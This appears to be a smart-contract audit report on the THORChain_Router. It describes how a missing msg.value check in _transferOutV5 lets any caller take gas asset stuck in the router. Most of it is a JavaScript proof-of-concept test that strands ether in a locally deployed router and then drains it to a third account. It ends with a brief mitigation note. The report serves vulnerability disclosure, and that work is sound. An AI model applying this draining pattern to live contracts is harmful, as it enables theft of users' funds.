# Vulnerability details

## Impact
When there is a gas asset that is stuck in the Router, because of the missing `msg.value` check, everyone can call
`THORChain_Router::_transferOutV5` with the desired amount and directly transfer the gas asset from the `THORChain_Router` to him. The attacker can do it in portions, if he has not enough gas asset, or do it with a flash loan.
Combined with the missing check for the `msg.value` ([M-01]) this leads to a high chance of users losing their funds

Funds from the `THORChain_Router` can be easily stolen by everyone

## Proof of Concept
Please add a new test file called for example `5_Steal_Stuck_Ether.js` and paste the code from below.
The code firstly simulates stucking ether in the router and a third-party user steals all of it:

```javascript
const Router = artifacts.require('THORChain_Router');
const Aggregator = artifacts.require('THORChain_Aggregator');
const SushiRouter = artifacts.require('SushiRouterSmol');
const Token = artifacts.require('ERC20Token');
const Weth = artifacts.require('WETH');
const BigNumber = require('bignumber.js');
const { expect } = require('chai');
function BN2Str(BN) {
  return new BigNumber(BN).toFixed();
}
function getBN(BN) {
  return new BigNumber(BN);
}

var ROUTER, ASGARD, AGG, WETH, SUSHIROUTER, TOKEN, WETH, USER1, USER2, USER3;
var ETH = '0x0000000000000000000000000000000000000000';
const _10 = '10000000000000000000';

describe('Missing assertion for gas asset being 0 in transfer out function', function () {
  let accounts;

  before(async function () {
    accounts = await web3.eth.getAccounts();
    ROUTER = await Router.new();
    TOKEN = await Token.new();
    USER1 = accounts[0];
    USER2 = accounts[1];
    ASGARD = accounts[3];
    WETH = await Weth.new();
    SUSHIROUTER = await SushiRouter.new(WETH.address);
    AGG = await Aggregator.new(WETH.address, SUSHIROUTER.address);
  });

  it('Everyone could steal the gas asset from the router', async function () {
    /* Get the starting balances */
    const startingRouterBalance = await web3.eth.getBalance(ROUTER.address);
    const startingUSER2Balance = await web3.eth.getBalance(USER2);

    /* Log the starting balances */
    console.log(`ROUTER starting balance: ${BN2Str(startingRouterBalance)}`);
    console.log(`ROUTER USER2 balance: ${BN2Str(startingUSER2Balance)}`);

    /* Vaults or users has already stuck by mistake the gas asset in the Router */
    await ROUTER.transferOut(USER1, TOKEN.address, '0', '', {
      from: ASGARD,
      value: _10,
    });
    await ROUTER.transferOutV5([ASGARD, TOKEN.address, '0', ''], {
      from: USER1,
      value: _10,
    });

    /* Get the after stucking gas asset router balance */
    const afterStuckingRouterBalance = await web3.eth.getBalance(
      ROUTER.address
    );

    /* Log the router after stucking gas asset balance */
    console.log(
      `ROUTER after stucking balance: ${BN2Str(afterStuckingRouterBalance)}`
    );

    /* Assert that the router has been drained */
    expect(
      getBN(afterStuckingRouterBalance).isGreaterThan(
        getBN(startingRouterBalance)
      )
    ).to.equal(true);

    const halfOfTheBalance = getBN(afterStuckingRouterBalance).div(2);
    /* 
      Someone sees that the Router has gas asset and steals it
      He may do it in portions or take a flash loan and take it all
     */
    await ROUTER.transferOutV5([USER2, ETH, halfOfTheBalance, ''], {
      from: USER2,
    });
    await ROUTER.transferOutV5([USER2, ETH, halfOfTheBalance, ''], {
      from: USER2,
    });

    /* Get the ending balances */
    const endingRouterBalance = await web3.eth.getBalance(ROUTER.address);
    const endingUSER2Balance = await web3.eth.getBalance(USER2);

    /* Log the ending balances */
    console.log(`ROUTER ending balance: ${BN2Str(endingRouterBalance)}`);
    console.log(`ROUTER USER2 balance: ${BN2Str(endingUSER2Balance)}`);

    /* Assert that the router has been drained */
    expect(
      getBN(endingRouterBalance).isLessThan(getBN(afterStuckingRouterBalance))
    ).to.equal(true);

    expect(
      getBN(endingUSER2Balance).isGreaterThan(getBN(startingUSER2Balance))
    ).to.equal(true);
  });
});
```

## Recommended Mitigation Steps
Prevent stucking of funds in the `THORChain_Router` and consider using `msg.value` since the router is meant just to pass the `msg.value`. This assumes that the caller will always have enough gas asset, so you can rely on `msg.value`
